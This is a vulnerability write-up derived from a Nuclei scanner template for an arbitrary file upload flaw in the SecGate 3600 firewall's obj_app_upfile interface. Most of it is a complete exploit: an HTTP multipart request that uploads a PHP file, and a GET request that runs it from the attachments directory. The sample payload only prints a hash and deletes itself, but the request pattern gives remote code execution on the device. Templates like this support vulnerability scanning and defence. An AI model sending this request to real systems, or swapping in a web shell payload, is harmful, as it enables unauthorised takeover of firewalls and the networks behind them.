# Nuclei Template: SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload
**Template ID:** secgate-3600-file-upload
**Vulnerability Class:** Unrestricted Upload of File with Dangerous Type
**Severity:** Critical
**CWE:** CWE-434
**Source:** Nuclei Template (`secgate-3600-file-upload.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file upload vulnerability in the obj_app_upfile interface of Internet SecGate 3600 firewall. An attacker can obtain server permissions by constructing a special request package.

## Steps to reproduce / Exploit Payload
```http
POST /?g=obj_app_upfile HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{string}}
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundary{{string}}
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundary{{string}}
Content-Disposition: form-data; name="upfile"; filename="{{filename}}.php"
Content-Type: text/plain

<?php echo md5("{{string}}");unlink(__FILE__);?>

------WebKitFormBoundary{{string}}
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundary{{string}}
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundary{{string}}--

GET /attachements/{{filename}}.php HTTP/1.1
Host: {{Hostname}}
```

## References
- https://peiqi.wgpsec.org/wiki/iot/%E5%A5%87%E5%AE%89%E4%BF%A1/%E7%BD%91%E7%A5%9E%20SecGate%203600%20%E9%98%B2%E7%81%AB%E5%A2%99%20obj_app_upfile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/%E5%A5%87%E5%AE%89%E4%BF%A1/%E7%BD%91%E7%A5%9E%20SecGate%203600%20%E9%98%B2%E7%81%AB%E5%A2%99%20obj_app_upfile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
